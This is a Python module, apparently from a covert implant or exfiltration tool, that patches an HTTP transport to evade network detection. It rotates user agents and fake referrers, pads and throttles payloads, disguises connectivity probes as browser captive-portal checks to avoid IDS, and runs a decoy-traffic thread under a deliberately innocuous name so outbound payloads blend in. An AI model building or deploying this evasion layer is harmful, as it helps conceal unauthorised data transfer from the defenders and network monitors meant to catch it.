"""
Transport bridge — wires the network normaliser into actual transports.

The original ``NetworkNormalizer`` provides stealth headers, UA rotation,
and timing jitter but was never connected to the real ``HttpTransport``.
This bridge patches the transport layer at runtime.

Also provides:
  - Decoy traffic generator (periodic HTTPS GETs to popular sites)
  - Referrer header rotation to mimic browser navigation
  - Connectivity probe obfuscation (HTTPS GET instead of bare TCP SYN)

Research notes (Feb 2026):
  - ``Noisy`` and ``Noisier`` projects (GitHub) generate random HTTP/DNS noise
  - Randomised 1-5s intervals between decoy requests
  - Decoy targets should be CDNs/popular sites (google.com, cdn.jsdelivr.net)

Usage::

    from stealth.transport_bridge import TransportBridge

    bridge = TransportBridge(network_normalizer, config)
    bridge.patch_transport(http_transport)
    bridge.start_decoy_traffic()
"""
from __future__ import annotations

import logging
import random
import threading
import time
from typing import Any, Callable
from urllib.parse import urlparse

logger = logging.getLogger(__name__)

# ── Decoy traffic targets ────────────────────────────────────────────
# These are high-traffic sites where our requests blend in naturally.

_DECOY_URLS = [
    "https://www.google.com/generate_204",           # Google connectivity check
    "https://detectportal.firefox.com/canonical.html", # Firefox captive portal
    "https://www.apple.com/library/test/success.html", # Apple captive portal
    "https://cdn.jsdelivr.net/npm/jquery/dist/jquery.min.js",
    "https://ajax.googleapis.com/ajax/libs/jquery/3.7.1/jquery.min.js",
    "https://cdnjs.cloudflare.com/ajax/libs/lodash.js/4.17.21/lodash.min.js",
    "https://api.github.com/zen",                     # GitHub simple API
    "https://httpbin.org/get",
]

# Referrer headers that mimic natural browser navigation
_REFERRERS = [
    "https://www.google.com/",
    "https://www.google.com/search?q=system+update",
    "https://github.com/",
    "https://stackoverflow.com/",
    "https://www.reddit.com/",
    "https://mail.google.com/",
    "https://docs.google.com/",
    "https://www.youtube.com/",
    "",  # direct navigation (no referrer)
]


class TransportBridge:
    """Bridges the NetworkNormalizer to actual transport implementations.

    Parameters
    ----------
    normalizer : NetworkNormalizer
        The network normalizer instance from stealth.
    config : dict
        The ``stealth.network`` config section.
    """

    def __init__(self, normalizer: Any, config: dict[str, Any] | None = None) -> None:
        cfg = config or {}
        self._normalizer = normalizer
        self._decoy_enabled: bool = bool(cfg.get("decoy_traffic", False))
        self._decoy_interval_min: float = float(cfg.get("decoy_interval_min", 30))
        self._decoy_interval_max: float = float(cfg.get("decoy_interval_max", 120))
        self._decoy_thread: threading.Thread | None = None
        self._stop_event = threading.Event()

    # ── Transport patching ───────────────────────────────────────────

    def patch_transport(self, transport: Any) -> None:
        """Monkey-patch an HTTP transport to use the network normaliser.

        Wraps the transport's ``send()`` method to:
          1. Apply stealth headers (UA, Accept, etc.) to the session
          2. Add a random Referer header
          3. Apply bandwidth throttling
          4. Respect send-window scheduling
        """
        if not hasattr(transport, "send"):
            return

        original_send = transport.send

        def stealth_send(payload: bytes, metadata: dict[str, str] | None = None) -> bool:
            # Check send window
            if not self._normalizer.is_in_send_window():
                logger.debug("Outside send window, buffering")
                return False

            # Apply stealth headers to the transport's session
            session = getattr(transport, "_session", None)
            if session is not None:
                self._normalizer.apply_to_session(session)
                # Add random Referer
                session.headers["Referer"] = random.choice(_REFERRERS)

            # Normalize payload size
            if payload:
                payload = self._normalizer.normalize_payload(payload)

            # Bandwidth throttling
            if payload:
                self._normalizer.throttle_wait(len(payload))

            return original_send(payload, metadata)

        transport.send = stealth_send
        logger.debug("Transport patched with stealth bridge")

    def patch_connectivity_probe(self, connectivity_monitor: Any) -> None:
        """Replace the bare TCP probe with an HTTPS GET.

        The original ``ConnectivityMonitor._measure_latency()`` does a bare
        TCP SYN which is detectable by IDS. Replace with an HTTPS GET
        that looks like a normal browser health check.
        """
        if not hasattr(connectivity_monitor, "_measure_latency"):
            return

        def stealth_probe() -> float | None:
            """HTTPS GET probe disguised as a browser connectivity check."""
            try:
                import requests
                url = random.choice([
                    "https://www.google.com/generate_204",
                    "https://detectportal.firefox.com/canonical.html",
                    "https://www.apple.com/library/test/success.html",
                ])
                start = time.monotonic()
                resp = requests.get(
                    url,
                    timeout=5,
                    headers={
                        "User-Agent": self._normalizer.get_user_agent(),
                        "Accept": "text/html",
                    },
                    allow_redirects=False,
                )
                elapsed = (time.monotonic() - start) * 1000  # ms
                return elapsed
            except Exception:
                return None

        connectivity_monitor._measure_latency = stealth_probe
        logger.debug("Connectivity probe patched to HTTPS GET")

    # ── Decoy traffic ────────────────────────────────────────────────

    def start_decoy_traffic(self) -> None:
        """Start a background thread that generates cover traffic."""
        if not self._decoy_enabled or self._decoy_thread is not None:
            return

        self._stop_event.clear()
        self._decoy_thread = threading.Thread(
            target=self._decoy_loop,
            name="CompletionPort-0",  # innocuous thread name
            daemon=True,
        )
        self._decoy_thread.start()
        logger.debug("Decoy traffic generator started")

    def stop_decoy_traffic(self) -> None:
        self._stop_event.set()
        if self._decoy_thread and self._decoy_thread.is_alive():
            self._decoy_thread.join(timeout=5)
        self._decoy_thread = None

    def _decoy_loop(self) -> None:
        """Generate periodic decoy HTTP requests to popular sites."""
        while not self._stop_event.is_set():
            try:
                self._send_decoy_request()
            except Exception:
                pass

            # Random interval between decoy requests
            wait = random.uniform(self._decoy_interval_min, self._decoy_interval_max)
            self._stop_event.wait(wait)

    def _send_decoy_request(self) -> None:
        """Send a single decoy request to a random popular site."""
        try:
            import requests

            url = random.choice(_DECOY_URLS)
            headers = {
                "User-Agent": self._normalizer.get_user_agent(),
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.9",
                "Accept-Encoding": "gzip, deflate, br",
                "Connection": "keep-alive",
                "Referer": random.choice(_REFERRERS),
            }

            # Use a short timeout — we don't care about the response
            requests.get(url, headers=headers, timeout=10, allow_redirects=True)
        except Exception:
            pass  # decoy failures are expected and irrelevant
